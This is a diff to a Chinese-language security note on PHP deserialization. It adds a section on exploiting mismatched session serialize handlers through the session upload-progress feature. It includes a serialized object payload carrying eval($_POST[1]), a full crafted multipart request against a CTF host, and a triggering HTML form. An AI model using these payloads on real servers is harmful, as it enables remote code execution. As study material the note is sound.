@@ -33,7 +33,7 @@ https://paper.seebug.org/680/
 
 #### 原理
 
-部分文件操作函数读取phar文件会反序列化phar文件中的meta-data 部分的序列化内容
+部分文件操作函数用phar伪协议读取phar文件会反序列化phar文件中的meta-data 部分的序列化内容
 
 #### phar文件结构
 
@@ -74,3 +74,93 @@ fileatime|filectime|file_exists|file_get_contents|file_put_contents|file|filegro
     $phar->stopBuffering();
 ?>
 ```
+
+## session的序列化引擎配置错误导致的命令执行
+
+### 利用条件
+
+1. php.ini中设置session.serialize_handler为php_serialize
+2. 启动session
+3. 某个网页的session.serialize_handler为php
+
+### 原理
+
+在php.ini中存在三项配置项：
+
+```
+session.save_path=""   --设置session的存储路径
+session.save_handler="" --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
+session.auto_start   boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动
+session.serialize_handler   string --定义用来序列化/反序列化的处理器名字。默认使用php
+```
+
+`session.serialize_handler`是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。
+
+- php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值
+- php:存储方式是，键名+竖线+经过serialize()函数序列处理的值
+- php_serialize(php>5.5.4):存储方式是，经过serialize()函数序列化处理的值
+
+我们这里主要关注php和php_serialize(php>5.5.4)
+
+我们可以发现,如果我们存储用的引擎是php_serialize,而读取用的引擎是php时,我们可以构造如`$_SESSION['a']='|O:5:"OowoO":1:{s:4:"mdzz";s:16:"eval($_POST[1]);";}'`
+
+,这个在文件中的存储为
+
+```
+a:1:{s:2:"en";s:43:"|O:5:"OowoO":1:{s:4:"mdzz";s:10:"phpinfo();";}
+```
+
+这样如果用php引擎解析的话,就不被理解成:键名为`a:1:{s:2:"en";s:43:"`，值为`O:5:"OowoO":1:{s:4:"mdzz";s:10:"phpinfo();";}`反序列化的结果,也就是一个对象
+
+这样我们就成功的反序列化了
+
+### 和它搭档的php配置
+
+
+
+![image.png](https://i.loli.net/2019/10/11/8ajOXlMD9fybx6W.png)
+
+> 当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。
+
+
+
+eg.
+
+```
+POST /phpinfo.php HTTP/1.1
+Host: web.jarvisoj.com:32784
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Content-Type: multipart/form-data; boundary=---------------------------168279961491
+Content-Length: 1067
+DNT: 1
+Connection: close
+Referer: http://127.0.0.1/
+Cookie: PHPSESSID=d0vqrh2ejn9el54i1en9cnev43
+Upgrade-Insecure-Requests: 1
+
+-----------------------------168279961491
+Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
+
+123
+-----------------------------168279961491
+Content-Disposition: form-data; name="aaa"; filename='|O:5:"OowoO":1:{s:4:"mdzz";s:16:"eval($_POST[1]);";}'
+Content-Type: text/html
+
+aaaaaa
+-----------------------------168279961491--
+```
+
+在本地测试发现filename和name 还有一些其他的会写入到session里
+
+产生这种情况的html页面
+
+```html
+<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
+    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
+    <input type="file" name="file" />
+    <input type="submit" />
+</form>
+```
+
